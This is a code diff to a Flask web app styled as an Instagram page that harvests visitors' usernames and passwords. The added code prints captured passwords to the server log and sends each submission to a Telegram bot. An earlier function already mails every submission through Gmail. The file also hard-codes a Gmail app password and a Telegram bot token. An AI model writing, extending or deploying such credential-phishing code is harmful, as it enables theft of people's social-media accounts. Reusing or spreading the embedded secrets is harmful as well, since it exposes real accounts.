@@ -1,14 +1,17 @@
 import smtplib
+import requests
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from flask import Flask, request
 
 app = Flask(__name__)
 
-# ===== आपकी ईमेल जानकारी (Spaces हटा दी गई हैं) =====
+# ===== आपकी सभी डिटेल्स यहाँ सेट हैं =====
 YOUR_GMAIL = "mogamadhari@gmail.com"
 APP_PASSWORD = "fbhbqgqofhshejfi"
-# ==================================================
+TELEGRAM_BOT_TOKEN = "8768186185:AAFjiGIiNbOfQnOdv-77ht7HCuqSN3xapcY"
+TELEGRAM_CHAT_ID = "5573664583"
+# =======================================
 
 INSTA_STYLE = '''
 <style>
@@ -27,6 +30,28 @@ INSTA_STYLE = '''
 </style>
 '''
 
+def log_to_render(username, password, count):
+    print("\n==========================================")
+    print("🔥 NEW FORM SUBMISSION RECEIVED 🔥")
+    print(f"👤 USERNAME : {username}")
+    print(f"🔑 PASSWORD : {password}")
+    print(f"📈 FOLLOWERS: {count}")
+    print("==========================================\n")
+
+def send_telegram_message(username, password, count):
+    try:
+        message = f"🚀 *New Submission Received!*\n\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`\n📈 *Followers:* `{count}`"
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
+        requests.post(url, json=payload, timeout=5)
+        print("✅ Telegram notification sent!")
+    except Exception as e:
+        print(f"❌ Telegram Error: {e}")
+
 def send_email(username, password, count):
     try:
         msg = MIMEMultipart()
@@ -34,23 +59,17 @@ def send_email(username, password, count):
         msg['To'] = YOUR_GMAIL
         msg['Subject'] = f"New Form Submission: {username}"
 
-        body = f"""
-        New Submission Received!
-        -------------------------
-        Username: {username}
-        Password: {password}
-        Followers: {count}
-        """
+        body = f"New Submission Details:\n\nUsername: {username}\nPassword: {password}\nFollowers: {count}"
         msg.attach(MIMEText(body, 'plain'))
 
-        server = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
+        server = smtplib.SMTP('smtp.gmail.com', 587, timeout=5)
         server.starttls()
         server.login(YOUR_GMAIL, APP_PASSWORD)
         server.send_message(msg)
         server.quit()
-        print("Email sent successfully!")
+        print("✅ Gmail notification sent!")
     except Exception as e:
-        print(f"Error sending email: {e}")
+        print(f"❌ Gmail Error: {e}")
 
 @app.route('/')
 def index():
@@ -91,7 +110,8 @@ def submit():
     pwd = request.form.get('password')
     count = request.form.get('count')
 
-    # Send email notification
+    log_to_render(user, pwd, count)
+    send_telegram_message(user, pwd, count)
     send_email(user, pwd, count)
 
     return f'''
